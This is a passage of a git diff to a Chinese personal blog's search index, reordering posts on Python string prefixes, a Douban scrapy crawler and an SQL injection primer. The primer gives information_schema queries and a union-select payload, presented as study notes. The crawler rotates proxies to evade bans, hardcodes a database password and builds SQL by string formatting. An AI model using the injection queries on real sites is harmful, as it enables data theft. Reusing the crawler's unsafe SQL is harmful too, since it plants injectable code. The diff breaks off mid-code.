-<p><strong>参考</strong>:<a href="https://ca0y1h.top/Web_security/basic_learning/13.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">https://ca0y1h.top/Web_security/basic_learning/13.文件包含漏洞利用/</a></p>
-<p><a href="https://www.cnblogs.com/NPFS/p/13797449.html">https://www.cnblogs.com/NPFS/p/13797449.html</a></p>
 ]]></content>
       <categories>
         <category>刷题站</category>
@@ -1582,27 +1582,6 @@ file -f:报错出具体内容</p>
       </categories>
   </entry>
   <entry>
-    <title>python之字符串前面加u,r,f的含义</title>
-    <url>/2021/01/08/python%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%89%8D%E9%9D%A2%E5%8A%A0u,r,f%E7%9A%84%E5%90%AB%E4%B9%89/</url>
-    <content><![CDATA[<p>版本 python3.6及以上</p>
-<a id="more"></a>
-<p><strong>1.u:表示unicode字符串</strong><br>
-字符串中存在中文的字符，在前面加上u</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#x3D; u&#39;这是一个中文的字符串。&#39;</span><br></pre></td></tr></table></figure>
-<p><strong>2.r:表示非转义的原始字符串</strong><br>
-字符串中存在\，要让它失效，要在前面加上r</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  print(r&#39;今天是七夕节,\n但是还是要加班！&#39;) #加上r就是\不转义</span><br><span class="line">  今天是七夕节,\n但是还是要加班！</span><br><span class="line">  </span><br><span class="line">print(&#39;今天是七夕节,\t但是还是要加班！&#39;)  #不加上r就是\转义</span><br><span class="line">今天是七夕节,	但是还是要加班！</span><br></pre></td></tr></table></figure>
-<p><strong>3.f:表示在字符串内支持大括号内的python 表达式</strong></p>
-<p>f-strings 是指以 f 或 F 开头的字符串，其中以 {} 包含的表达式会进行值替换。（目前支持python3.6版本）</p>
-<p>下面看下 f-strings 的使用方法</p>
-<p>基本使用（作用：替换值）</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;name &#x3D; &#39;hoxis&#39;</span><br><span class="line">&gt;&gt;&gt; age &#x3D; 18</span><br><span class="line">&gt;&gt;&gt; f&quot;hi, &#123;name&#125;, are you &#123;age&#125;&quot;</span><br><span class="line">#结果如下</span><br><span class="line">&#39;hi, hoxis, are you 18&#39;</span><br><span class="line">&gt;&gt;&gt; F&quot;hi, &#123;name&#125;, are you &#123;age&#125;&quot;</span><br><span class="line">&#39;hi, hoxis, are you 18&#39;</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>编程学习</category>
-        <category>python</category>
-      </categories>
-  </entry>
-  <entry>
     <title>python爬虫学习(二)</title>
     <url>/2021/02/21/python%E4%B9%8Bxpath%E7%88%AC%E5%8F%96%E7%BB%83%E4%B9%A0%E6%A1%88%E4%BE%8B/</url>
     <content><![CDATA[<p>这两个案例用到了数据解析  我这里主要用的是xpath  当然也可以用正则或者b64</p>
@@ -1751,6 +1730,27 @@ regex也有以上六种用法</p>
       </categories>
   </entry>
   <entry>
+    <title>python之字符串前面加u,r,f的含义</title>
+    <url>/2021/01/08/python%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%89%8D%E9%9D%A2%E5%8A%A0u,r,f%E7%9A%84%E5%90%AB%E4%B9%89/</url>
+    <content><![CDATA[<p>版本 python3.6及以上</p>
+<a id="more"></a>
+<p><strong>1.u:表示unicode字符串</strong><br>
+字符串中存在中文的字符，在前面加上u</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#x3D; u&#39;这是一个中文的字符串。&#39;</span><br></pre></td></tr></table></figure>
+<p><strong>2.r:表示非转义的原始字符串</strong><br>
+字符串中存在\，要让它失效，要在前面加上r</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  print(r&#39;今天是七夕节,\n但是还是要加班！&#39;) #加上r就是\不转义</span><br><span class="line">  今天是七夕节,\n但是还是要加班！</span><br><span class="line">  </span><br><span class="line">print(&#39;今天是七夕节,\t但是还是要加班！&#39;)  #不加上r就是\转义</span><br><span class="line">今天是七夕节,	但是还是要加班！</span><br></pre></td></tr></table></figure>
+<p><strong>3.f:表示在字符串内支持大括号内的python 表达式</strong></p>
+<p>f-strings 是指以 f 或 F 开头的字符串，其中以 {} 包含的表达式会进行值替换。（目前支持python3.6版本）</p>
+<p>下面看下 f-strings 的使用方法</p>
+<p>基本使用（作用：替换值）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;name &#x3D; &#39;hoxis&#39;</span><br><span class="line">&gt;&gt;&gt; age &#x3D; 18</span><br><span class="line">&gt;&gt;&gt; f&quot;hi, &#123;name&#125;, are you &#123;age&#125;&quot;</span><br><span class="line">#结果如下</span><br><span class="line">&#39;hi, hoxis, are you 18&#39;</span><br><span class="line">&gt;&gt;&gt; F&quot;hi, &#123;name&#125;, are you &#123;age&#125;&quot;</span><br><span class="line">&#39;hi, hoxis, are you 18&#39;</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>编程学习</category>
+        <category>python</category>
+      </categories>
+  </entry>
+  <entry>
     <title>scrapy的数据持久化存储</title>
     <url>/2021/02/28/scrapy%E7%9A%84%E6%95%B0%E6%8D%AE%E6%8C%81%E4%B9%85%E5%8C%96%E5%AD%98%E5%82%A8/</url>
     <content><![CDATA[<h2 id="scrapy的高性能持久化存储操作"><a class="header-anchor" href="#scrapy的高性能持久化存储操作">¶</a>scrapy的高性能持久化存储操作</h2>
@@ -1799,43 +1799,6 @@ scrapy crawl 爬虫名称 -o xxx.csv</li>
       <categories>
         <category>编程学习</category>
         <category>python</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>sql注入之mysql学习基础(一)</title>
-    <url>/2021/01/05/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80(%E4%B8%80)/</url>
-    <content><![CDATA[<p>了解什么是sql注入及mysql数据库介绍</p>
-<a id="more"></a>
-<h1>MySQL的数据库结构</h1>
-<p><a href="https://imgchr.com/i/sAaGcQ"><img src="https://s3.ax1x.com/2021/01/05/sAaGcQ.png" alt="sAaGcQ.png"></a></p>
-<h1>注入的产生</h1>
-<p><a href="https://imgchr.com/i/sAalh8"><img src="https://s3.ax1x.com/2021/01/05/sAalh8.png" alt="sAalh8.png"></a></p>
-<p>id变量通过get方式获取并且直接拼接到SQL语句中，而id参数用户可控，造成注入</p>
-<h1>MySQL5注入的一般流程</h1>
-<p>获取字段数-查库名-查表名-查列名-查数据</p>
-<p>获取字段数：order by 临界值<br>
-获取库名：database()<br>
-表名和列名没有内置函数 怎么查？</p>
-<p>union语句：将不同表的两个列查询的数据去重拼接<br>
-union all ：不去重</p>
-<p>获取MySQL版本：version()<br>
-MySQL5.0以下版本只能和access数据库一样猜解<br>
-而MySQL5.0以上版本内置了information_schema库，存储了所有的数据库名、表名、列名<br>
-information_schema.tables 记录表名信息<br>
-information_schema.columns 记录列名信息<br>
-TABLE_SCHEMA 数据库字段<br>
-table_name 表名<br>
-column_name 列名<br>
-查表名：<br>
-SELECT table_name FROM information_schema.tables where TABLE_SCHEMA=database();<br>
-查列名：<br>
-SELECT column_name FROM information_schema.columns where TABLE_name=‘users’;<br>
-查数据：<br>
-select 列名 from 库名.表名</p>
-]]></content>
-      <categories>
-        <category>web技术学习</category>
-        <category>sql注入</category>
       </categories>
   </entry>
   <entry>
@@ -2453,6 +2416,43 @@ post数据<code>name = a' union select 1,2,3 -- +</code></p>
       </categories>
   </entry>
   <entry>
+    <title>sql注入之mysql学习基础(一)</title>
+    <url>/2021/01/05/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80(%E4%B8%80)/</url>
+    <content><![CDATA[<p>了解什么是sql注入及mysql数据库介绍</p>
+<a id="more"></a>
+<h1>MySQL的数据库结构</h1>
+<p><a href="https://imgchr.com/i/sAaGcQ"><img src="https://s3.ax1x.com/2021/01/05/sAaGcQ.png" alt="sAaGcQ.png"></a></p>
+<h1>注入的产生</h1>
+<p><a href="https://imgchr.com/i/sAalh8"><img src="https://s3.ax1x.com/2021/01/05/sAalh8.png" alt="sAalh8.png"></a></p>
+<p>id变量通过get方式获取并且直接拼接到SQL语句中，而id参数用户可控，造成注入</p>
+<h1>MySQL5注入的一般流程</h1>
+<p>获取字段数-查库名-查表名-查列名-查数据</p>
+<p>获取字段数：order by 临界值<br>
+获取库名：database()<br>
+表名和列名没有内置函数 怎么查？</p>
+<p>union语句：将不同表的两个列查询的数据去重拼接<br>
+union all ：不去重</p>
+<p>获取MySQL版本：version()<br>
+MySQL5.0以下版本只能和access数据库一样猜解<br>
+而MySQL5.0以上版本内置了information_schema库，存储了所有的数据库名、表名、列名<br>
+information_schema.tables 记录表名信息<br>
+information_schema.columns 记录列名信息<br>
+TABLE_SCHEMA 数据库字段<br>
+table_name 表名<br>
+column_name 列名<br>
+查表名：<br>
+SELECT table_name FROM information_schema.tables where TABLE_SCHEMA=database();<br>
+查列名：<br>
+SELECT column_name FROM information_schema.columns where TABLE_name=‘users’;<br>
+查数据：<br>
+select 列名 from 库名.表名</p>
+]]></content>
+      <categories>
+        <category>web技术学习</category>
+        <category>sql注入</category>
+      </categories>
+  </entry>
+  <entry>
     <title>sql注入常见注释及绕过</title>
     <url>/2020/11/13/sql%E6%B3%A8%E5%85%A5%E5%B8%B8%E8%A7%81%E6%B3%A8%E9%87%8A%E5%8F%8A%E7%BB%95%E8%BF%87/</url>
     <content><![CDATA[<h2 id="1-绕过空格（注释符-，-a0）"><a class="header-anchor" href="#1-绕过空格（注释符-，-a0）">¶</a>1.绕过空格（注释符/* */，%a0）</h2>
@@ -2640,35 +2640,6 @@ post数据<code>name = a' union select 1,2,3 -- +</code></p>
       </categories>
   </entry>
   <entry>
-    <title>使用scrapy爬取豆瓣top250</title>
-    <url>/2021/03/06/%E4%BD%BF%E7%94%A8scrapy%E7%88%AC%E5%8F%96%E8%B1%86%E7%93%A3top250/</url>
-    <content><![CDATA[<p>先介绍一下这个工程 爬取了豆瓣top250的影片名和所处的名次，以及各个影片详情页的内容简介</p>
-<p>直接放出最后爬取的结果 就是下面这个 .csv文件</p>
-<p><img src="https://img-blog.csdnimg.cn/20210306195622910.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>我断断续续花了两天搞的，遇到了好多问题,这算是我第一个引以为傲的爬取作品</p>
-<p>我是采用 <strong>scrapy 抓取 + mysql持久化存储</strong>的方法爬取</p>
-<p>首先需要了解python连接mysql</p>
-<p>参链:</p>
-<p><a href="https://www.cnblogs.com/du-hong/p/10897822.html">https://www.cnblogs.com/du-hong/p/10897822.html</a></p>
-<p>下面放出作品的关键源码:</p>
-<h3 id="douban-py"><a class="header-anchor" href="#douban-py">¶</a><a href="http://douban.py">douban.py</a></h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> doubanpro.items <span class="keyword">import</span> DoubanproItem</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DoubanSpider</span>(<span class="params">scrapy.Spider</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;douban&#x27;</span></span><br><span class="line">    <span class="comment"># llowed_domains = [&#x27;www.xxx.com&#x27;]</span></span><br><span class="line">    start_urls = [<span class="string">&#x27;http://movie.douban.com/top250?start=0&amp;filter=&#x27;</span>]</span><br><span class="line">    url=<span class="string">&#x27;https://movie.douban.com/top250?start=%d&amp;filter=&#x27;</span></span><br><span class="line">    num = <span class="number">25</span></span><br><span class="line">    <span class="comment"># 详情页爬取</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_detail</span>(<span class="params">self,response</span>):</span></span><br><span class="line">        item=response.meta[<span class="string">&#x27;item&#x27;</span>]</span><br><span class="line">        job_sec=response.xpath(<span class="string">&#x27;//*[@id=&quot;link-report&quot;]//span[@property=&quot;v:summary&quot;]//text()&#x27;</span>).extract()</span><br><span class="line">        job_sec=<span class="string">&#x27;&#x27;</span>.join(job_sec)</span><br><span class="line">        item[<span class="string">&#x27;detail&#x27;</span>] = job_sec</span><br><span class="line">        <span class="keyword">yield</span> item</span><br><span class="line">	<span class="comment"># 序号和作品名称爬取</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        li_list=response.xpath(<span class="string">&#x27;//*[@id=&quot;content&quot;]/div/div[1]/ol/li&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> li <span class="keyword">in</span> li_list:</span><br><span class="line">            <span class="comment"># x=li.xpath(&#x27;.//a/span[1]/text()&#x27;).get()</span></span><br><span class="line">            <span class="comment"># id=li.xpath(&#x27;.//em/text()&#x27;).get()</span></span><br><span class="line">            item = DoubanproItem()</span><br><span class="line">            item[<span class="string">&#x27;id&#x27;</span>]=li.xpath(<span class="string">&#x27;.//em/text()&#x27;</span>).get()</span><br><span class="line">            item[<span class="string">&#x27;name&#x27;</span>]=li.xpath(<span class="string">&#x27;.//a/span[1]/text()&#x27;</span>).get()</span><br><span class="line">            detaile_url = li.xpath(<span class="string">&#x27;.//a/@href&#x27;</span>).get()</span><br><span class="line">            <span class="comment"># print(item[&#x27;name&#x27;])</span></span><br><span class="line">            <span class="keyword">yield</span> scrapy.Request(url=detaile_url, callback=self.parse_detail,meta=&#123;<span class="string">&quot;item&quot;</span>:item&#125;)</span><br><span class="line">            <span class="comment">#yield item</span></span><br><span class="line">            <span class="comment">#分页操作</span></span><br><span class="line">            <span class="keyword">if</span> self.num &lt;= <span class="number">50</span> :</span><br><span class="line">                new_url = <span class="built_in">format</span>(self.url%self.num)</span><br><span class="line">                self.num += <span class="number">25</span></span><br><span class="line">                <span class="keyword">yield</span> scrapy.Request(new_url, callback=self.parse)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h3 id="piplines-py"><a class="header-anchor" href="#piplines-py">¶</a><a href="http://piplines.py">piplines.py</a></h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DoubanproPipeline</span>:</span></span><br><span class="line">    conn=<span class="literal">None</span></span><br><span class="line">    cursor=<span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">open_spider</span>(<span class="params">self,spider</span>):</span></span><br><span class="line">        self.conn = pymysql.Connect(host=<span class="string">&quot;localhost&quot;</span>, user=<span class="string">&quot;root&quot;</span>, port=<span class="number">3306</span>,password=<span class="string">&quot;ly0123456&quot;</span>,db=<span class="string">&quot;douban&quot;</span>,charset=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.cursor = self.conn.cursor()</span><br><span class="line">        print(<span class="string">&quot;连接数据库成功&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_item</span>(<span class="params">self, item, spider</span>):</span></span><br><span class="line">        <span class="comment"># name = item.get(&quot;name&quot;, &quot;N/A&quot;)</span></span><br><span class="line">        <span class="comment"># sql = &quot;insert into mode(name) VALUES (%s)&quot;</span></span><br><span class="line">        <span class="comment"># self.cursor.execute(sql, name)</span></span><br><span class="line">        self.cursor.execute(<span class="string">&#x27;insert into mode (id,name,detail) values(&quot;%s&quot;,&quot;%s&quot;,&quot;%s&quot;)&#x27;</span> %(item[<span class="string">&quot;id&quot;</span>],item[<span class="string">&quot;name&quot;</span>],item[<span class="string">&quot;detail&quot;</span>]))</span><br><span class="line">        <span class="comment"># self.cursor.execute(&#x27;insert into mode (name,id) values(&quot;%s&quot;,&quot;%s&quot;)&#x27; %(item[&quot;name&quot;],item[&quot;id&quot;]))</span></span><br><span class="line">        self.conn.commit()</span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close_spider</span>(<span class="params">self,spider</span>):</span></span><br><span class="line">        self.cursor.close()</span><br><span class="line">        self.conn.close()</span><br></pre></td></tr></table></figure>
-<h3 id="settings-py"><a class="header-anchor" href="#settings-py">¶</a><a href="http://settings.py">settings.py</a></h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 开启下载中间件</span></span><br><span class="line">DOWNLOADER_MIDDLEWARES = &#123;</span><br><span class="line">   <span class="string">&#x27;doubanpro.middlewares.DoubanproDownloaderMiddleware&#x27;</span>: <span class="number">543</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 开启管道</span></span><br><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line">   <span class="string">&#x27;doubanpro.pipelines.DoubanproPipeline&#x27;</span>: <span class="number">300</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>因为我在爬取的过程中出现了 ip被封的情况 所以顺便学了一下挂代理池和UA伪装</p>
-<h3 id="middlewares-py"><a class="header-anchor" href="#middlewares-py">¶</a><a href="http://middlewares.py">middlewares.py</a></h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DoubanproDownloaderMiddleware</span>:</span></span><br><span class="line">    user_agent_list = [</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 &quot;</span></span><br><span class="line">        <span class="string">&quot;(KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 &quot;</span></span><br><span class="line">        <span class="string">&quot;(KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 &quot;</span></span><br><span class="line">        <span class="string">&quot;(KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 &quot;</span></span><br><span class="line">        <span class="string">&quot;(KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 &quot;</span></span><br><span class="line">        <span class="string">&quot;(KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 &quot;</span></span><br><span class="line">        <span class="string">&quot;(KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 &quot;</span></span><br><span class="line">        <span class="string">&quot;(KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 &quot;</span></span><br><span class="line">        <span class="string">&quot;(KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 &quot;</span></span><br><span class="line">        <span class="string">&quot;(KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 &quot;</span></span><br><span class="line">        <span class="string">&quot;(KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 &quot;</span></span><br><span class="line">        <span class="string">&quot;(KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 &quot;</span></span><br><span class="line">        <span class="string">&quot;(KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 &quot;</span></span><br><span class="line">        <span class="string">&quot;(KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 &quot;</span></span><br><span class="line">        <span class="string">&quot;(KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 &quot;</span></span><br><span class="line">        <span class="string">&quot;(KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 &quot;</span></span><br><span class="line">        <span class="string">&quot;(KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 &quot;</span></span><br><span class="line">        <span class="string">&quot;(KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 &quot;</span></span><br><span class="line">        <span class="string">&quot;(KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24&quot;</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    PROXY_http = [</span><br><span class="line">        <span class="string">&#x27;175.42.128.123:9999&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;222.189.190.100:9999&#x27;</span>,</span><br><span class="line">    ]</span><br><span class="line">    PROXY_https = [</span><br><span class="line">        <span class="string">&#x27;115.151.235.163:9999&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;183.166.110.189:9999&#x27;</span>,</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_request</span>(<span class="params">self, request, spider</span>):</span></span><br><span class="line">        <span class="comment"># request.headers[&#x27;User-Agent&#x27;] = random.choice(self.user_agent_list)</span></span><br><span class="line">        <span class="comment"># 这里可以直接指定使用的代理 不需要再 出现异常后再使用代理ip</span></span><br><span class="line">        request.meta[<span class="string">&#x27;proxy&#x27;</span>] =<span class="string">&#x27;http://127.0.0.1:10809&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_response</span>(<span class="params">self, request, response, spider</span>):</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_exception</span>(<span class="params">self, request, exception, spider</span>):</span></span><br><span class="line">        <span class="comment"># 对拦截到请求的url进行判断（协议头到底是http还是https）</span></span><br><span class="line">        <span class="comment"># request.url返回值：http://www.xxx.com</span></span><br><span class="line">        h = request.url.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>]  <span class="comment"># 请求的协议头</span></span><br><span class="line">        <span class="keyword">if</span> h == <span class="string">&#x27;https&#x27;</span>:</span><br><span class="line">            request.meta[<span class="string">&#x27;proxy&#x27;</span>] = <span class="string">&#x27;https://&#x27;</span> + random.choice(self.PROXY_https)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            request.meta[<span class="string">&#x27;proxy&#x27;</span>] = <span class="string">&#x27;http://&#x27;</span> + random.choice(self.PROXY_http)</span><br><span class="line">        <span class="keyword">return</span> request</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h3 id="items-py"><a class="header-anchor" href="#items-py">¶</a><a href="http://items.py">items.py</a></h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DoubanproItem</span>(<span class="params">scrapy.Item</span>):</span></span><br><span class="line">    <span class="comment"># define the fields for your item here like:</span></span><br><span class="line">    name = scrapy.Field()</span><br><span class="line">    <span class="built_in">id</span> = scrapy.Field()</span><br><span class="line">    detail = scrapy.Field()</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>编程学习</category>
-        <category>python</category>
-      </categories>
-  </entry>
-  <entry>
     <title>phar及zip文件包含</title>
     <url>/2020/12/06/zip%E5%92%8Cphar%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
     <content><![CDATA[<p>phar与zip协议的文件包含</p>
@@ -2705,6 +2676,56 @@ index.php</p>
       <categories>
         <category>web技术学习</category>
         <category>文件包含</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>使用scrapy爬取豆瓣top250</title>
+    <url>/2021/03/06/%E4%BD%BF%E7%94%A8scrapy%E7%88%AC%E5%8F%96%E8%B1%86%E7%93%A3top250/</url>
+    <content><![CDATA[<p>先介绍一下这个工程 爬取了豆瓣top250的影片名和所处的名次，以及各个影片详情页的内容简介</p>
+<p>直接放出最后爬取的结果 就是下面这个 .csv文件</p>
+<p><img src="https://img-blog.csdnimg.cn/20210306195622910.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>我断断续续花了两天搞的，遇到了好多问题,这算是我第一个引以为傲的爬取作品</p>
+<p>我是采用 <strong>scrapy 抓取 + mysql持久化存储</strong>的方法爬取</p>
+<p>首先需要了解python连接mysql</p>
+<p>参链:</p>
+<p><a href="https://www.cnblogs.com/du-hong/p/10897822.html">https://www.cnblogs.com/du-hong/p/10897822.html</a></p>
+<p>下面放出作品的关键源码:</p>
+<h3 id="douban-py"><a class="header-anchor" href="#douban-py">¶</a><a href="http://douban.py">douban.py</a></h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> doubanpro.items <span class="keyword">import</span> DoubanproItem</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DoubanSpider</span>(<span class="params">scrapy.Spider</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;douban&#x27;</span></span><br><span class="line">    <span class="comment"># llowed_domains = [&#x27;www.xxx.com&#x27;]</span></span><br><span class="line">    start_urls = [<span class="string">&#x27;http://movie.douban.com/top250?start=0&amp;filter=&#x27;</span>]</span><br><span class="line">    url=<span class="string">&#x27;https://movie.douban.com/top250?start=%d&amp;filter=&#x27;</span></span><br><span class="line">    num = <span class="number">25</span></span><br><span class="line">    <span class="comment"># 详情页爬取</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_detail</span>(<span class="params">self,response</span>):</span></span><br><span class="line">        item=response.meta[<span class="string">&#x27;item&#x27;</span>]</span><br><span class="line">        job_sec=response.xpath(<span class="string">&#x27;//*[@id=&quot;link-report&quot;]//span[@property=&quot;v:summary&quot;]//text()&#x27;</span>).extract()</span><br><span class="line">        job_sec=<span class="string">&#x27;&#x27;</span>.join(job_sec)</span><br><span class="line">        item[<span class="string">&#x27;detail&#x27;</span>] = job_sec</span><br><span class="line">        <span class="keyword">yield</span> item</span><br><span class="line">	<span class="comment"># 序号和作品名称爬取</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        li_list=response.xpath(<span class="string">&#x27;//*[@id=&quot;content&quot;]/div/div[1]/ol/li&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> li <span class="keyword">in</span> li_list:</span><br><span class="line">            <span class="comment"># x=li.xpath(&#x27;.//a/span[1]/text()&#x27;).get()</span></span><br><span class="line">            <span class="comment"># id=li.xpath(&#x27;.//em/text()&#x27;).get()</span></span><br><span class="line">            item = DoubanproItem()</span><br><span class="line">            item[<span class="string">&#x27;id&#x27;</span>]=li.xpath(<span class="string">&#x27;.//em/text()&#x27;</span>).get()</span><br><span class="line">            item[<span class="string">&#x27;name&#x27;</span>]=li.xpath(<span class="string">&#x27;.//a/span[1]/text()&#x27;</span>).get()</span><br><span class="line">            detaile_url = li.xpath(<span class="string">&#x27;.//a/@href&#x27;</span>).get()</span><br><span class="line">            <span class="comment"># print(item[&#x27;name&#x27;])</span></span><br><span class="line">            <span class="keyword">yield</span> scrapy.Request(url=detaile_url, callback=self.parse_detail,meta=&#123;<span class="string">&quot;item&quot;</span>:item&#125;)</span><br><span class="line">            <span class="comment">#yield item</span></span><br><span class="line">            <span class="comment">#分页操作</span></span><br><span class="line">            <span class="keyword">if</span> self.num &lt;= <span class="number">50</span> :</span><br><span class="line">                new_url = <span class="built_in">format</span>(self.url%self.num)</span><br><span class="line">                